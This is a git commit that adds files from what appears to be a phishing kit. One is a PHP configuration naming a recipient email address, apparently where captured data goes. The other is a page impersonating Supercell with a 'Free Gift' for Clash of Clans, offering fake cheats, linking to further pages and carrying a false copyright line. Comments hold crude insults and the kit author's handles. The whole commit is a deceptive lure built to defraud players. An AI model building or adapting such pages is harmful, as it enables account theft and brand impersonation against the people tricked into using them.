d21d2a2fd792b486055d55b7eb2d713752a130b9
sonia9009 <SONIAJENIFER90@GMAIL.COM>
2024-06-27 23:02:55 +0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,10 @@
+<?php
+
+/* CREATED BY IWAN STER */
+
+/* SUNGGUH TEGA KAU... MEMBERI IMBALAN HANYA 10K GOBLOK KAU */
+
+$subjek = 'iwanster@dev';
+$mailto = 'ionetamvanz@gmail.com'; //masukin email lo disini
+
+?>
---
+++ js/menu.php
@@ -0,0 +1,53 @@
+<!--
+##             RAFLIPEDIA MAILER               ##
+##             fb.com/raflipedia               ##
+##             instagram.com/raflipedia614     ##
+##            twitter.com/arpanriski34         ##
+##            raflip-edia.blogspot.co.id       ##
+## JANGAN DIUBAH or RE-EDIT KALO GK MAU DIBILANG " ANJING " ##
+-->
+<html>
+<head>
+<title>Clash of Clans - Free Gift from Supercell</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="keywords" content="Free gift from supercell! Join now!" />
+<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
+<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" media="all">
+<link href="css/snow.css" rel="stylesheet" type="text/css" media="all" />
+<link href="css/style.css" rel="stylesheet" type="text/css" media="all" />
+<link href="http://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet">
+<link href="http://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700" rel="stylesheet">
+</head>
+<body>
+<div class="snow-container">
+			  <div class="snow foreground"></div>
+			  <div class="snow foreground layered"></div>
+			  <div class="snow middleground"></div>
+			  <div class="snow middleground layered"></div>
+			  <div class="snow background"></div>
+			  <div class="snow background layered"></div>
+			</div>
+<h1>Clash of Clans</h1>
+<div class="main-agileits">
+		<div class="form-w3-agile">
+			<h2 class="sub-agileits-w3layouts">Select your menu</h2>	
+				<div class="submit-w3l">
+					<a href="up-level-clan.php"><input type="submit" value="Up Level Clan"></a>
+				<div class="submit-w3l">
+					<a href="big-win.php"><input type="submit" value="Big Win"></a>
+				<div class="submit-w3l">
+					<a href="wall.php"><input type="submit" value="Strong Wall"></a>
+				<div class="submit-w3l">
+					<a href="win-war.php"><input type="submit" value="Auto Win War"></a>
+				<div class="submit-w3l">
+					<a href="spell.php"><input type="submit" value="Unlimited Spell"></a>
+			</form>
+		</div>
+		</div>
+	<div class="copyright w3-agile">
+		<p> © 2017 SUPERCELL Games Corporation . All rights reserved | Design by <a href="http://raflip-edia.blogspot.co.id/" target="_blank">RAFLIPEDIA</a></p>
+	</div> 
+	<script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
+</body>
+</html>
